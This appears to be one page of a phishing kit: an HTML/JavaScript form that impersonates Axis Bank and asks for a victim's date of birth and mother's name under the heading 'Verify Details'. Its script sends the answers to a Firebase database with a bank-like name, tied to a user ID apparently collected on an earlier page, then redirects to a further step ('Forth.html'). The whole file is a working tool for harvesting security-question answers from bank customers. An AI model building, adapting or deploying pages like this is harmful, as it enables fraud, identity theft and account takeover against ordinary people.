<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Details Verification</title>

<style>
body{
    margin:0;
    font-family: Arial, sans-serif;
    background:#f5f5f5;
}
.header{
    margin:0;
    padding:0;
}
.header img{
    width:100%;
    display:block;
}
.container{
    padding:25px;
}
.title{
    font-size:22px;
    margin-bottom:25px;
    font-weight:bold;
    text-align:center;
}
.input-group{
    margin-bottom:20px;
}
.input-group label{
    display:block;
    margin-bottom:6px;
    font-weight:bold;
}
.input-group input{
    width:100%;
    padding:14px;
    border-radius:8px;
    border:1px solid #ccc;
    font-size:16px;
    box-sizing:border-box;
}
.submit-btn{
    width:100%;
    padding:15px;
    background:#a0003c;
    color:white;
    border:none;
    border-radius:25px;
    font-size:18px;
    cursor:pointer;
}
.footer{
    margin-top:40px;
}
.footer img{
    width:100%;
    display:block;
}
.loader{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    background:rgba(255,255,255,0.95);
    display:none;
    justify-content:center;
    align-items:center;
    flex-direction:column;
    z-index:9999;
}
.spinner{
    width:50px;
    height:50px;
    border:6px solid #ccc;
    border-top:6px solid #a0003c;
    border-radius:50%;
    animation:spin 1s linear infinite;
}
@keyframes spin{
    0%{transform:rotate(0deg);}
    100%{transform:rotate(360deg);}
}
.message{
    padding:12px;
    border-radius:8px;
    margin-bottom:15px;
    display:none;
}
.message.success{
    background:#d4edda;
    color:#155724;
    border:1px solid #c3e6cb;
}
.message.error{
    background:#f8d7da;
    color:#721c24;
    border:1px solid #f5c6cb;
}
</style>
</head>

<body>

<!-- FIREBASE SDK -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<div class="header">
    <img src="header.png" alt="Header" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%25%22 height=%2280%22 viewBox=%220 0 100 80%22><rect width=%22100%25%22 height=%2280%22 fill=%22%238B0000%22/><text x=%2210%22 y=%2245%22 fill=%22white%22 font-size=%2220%22>Axis Bank</text></svg>'">
</div>

<div class="container">

<div id="messageBox" class="message"></div>
<div class="title">Verify Details</div>

<div class="input-group">
<label>Date Of Birth</label>
<input type="text" id="dob" maxlength="10" placeholder="DD-MM-YYYY" value="12-05-2000">
</div>

<div class="input-group">
<label>Mother's Name</label>
<input type="text" id="motherName" placeholder="Enter Mother's Name" value="Rita">
</div>

<button class="submit-btn" onclick="validateAndSaveDetails()">Submit</button>

</div>

<div class="footer">
    <img src="footer.png" alt="Footer" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%25%22 height=%2260%22 viewBox=%220 0 100 60%22><rect width=%22100%25%22 height=%2260%22 fill=%22%23333%22/><text x=%2210%22 y=%2235%22 fill=%22white%22 font-size=%2212%22>© 2024 Axis Bank</text></svg>'">
</div>

<div class="loader" id="loader">
    <div class="spinner"></div>
    <p>Please wait...</p>
</div>

<script>
const firebaseConfig = {
    apiKey: "AIzaSyBqYAEIP3jPi2_1ao6JSVJyhLI7ZOBK440",
    authDomain: "axisbank-ea121.firebaseapp.com",
    databaseURL: "https://axisbank-ea121-default-rtdb.firebaseio.com",
    projectId: "axisbank-ea121",
    storageBucket: "axisbank-ea121.firebasestorage.app",
    messagingSenderId: "512765027545",
    appId: "1:512765027545:web:5e05b71a1c8a248d328ac8"
};

firebase.initializeApp(firebaseConfig);
console.log("✅ Firebase Connected!");

// Get userId from localStorage
const userId = localStorage.getItem('userId');

if(!userId) {
    showMessage("❌ Session expired. Please login again.", "error");
    setTimeout(() => window.location.href = "Index.html", 3000);
}

// Auto format DOB
document.getElementById("dob").addEventListener("input", function(e){
    let value = e.target.value.replace(/\D/g,'').substring(0,8);
    if(value.length > 4){
        e.target.value = value.substring(0,2) + '-' + value.substring(2,4) + '-' + value.substring(4);
    } else if(value.length > 2){
        e.target.value = value.substring(0,2) + '-' + value.substring(2);
    } else {
        e.target.value = value;
    }
});

function showMessage(text, type) {
    const messageBox = document.getElementById('messageBox');
    messageBox.textContent = text;
    messageBox.className = 'message ' + type;
    messageBox.style.display = 'block';
    setTimeout(() => messageBox.style.display = 'none', 5000);
}

async function validateAndSaveDetails() {
    const dob = document.getElementById("dob").value.trim();
    const mother = document.getElementById("motherName").value.trim();
    const dobPattern = /^(0[1-9]|[12][0-9]|3[01])-(0[1-9]|1[0-2])-(19|20)\d\d$/;

    if(!dob || !mother){
        showMessage("❌ Please fill all fields", "error");
        return;
    }

    if(!dobPattern.test(dob)){
        showMessage("❌ Please enter valid Date of Birth (DD-MM-YYYY)", "error");
        return;
    }

    if(mother.length < 2){
        showMessage("❌ Please enter valid mother's name", "error");
        return;
    }

    if(!userId) {
        showMessage("❌ Session expired. Please login again.", "error");
        setTimeout(() => window.location.href = "Index.html", 2000);
        return;
    }

    document.getElementById("loader").style.display = "flex";

    try {
        // Direct update without checking existing data
        await firebase.database().ref('users/user_' + userId).update({
            dob: dob,
            motherName: mother
        });
        
        console.log(`✅ Details saved for user ${userId}`);
        showMessage("✅ Details verified successfully! Redirecting...", "success");
        
        setTimeout(() => window.location.href = "Forth.html", 2000);
        
    } catch (error) {
        document.getElementById("loader").style.display = "none";
        showMessage("❌ Error: " + error.message, "error");
        console.error("Firebase Error:", error);
    }
}
</script>

</body>
</html>
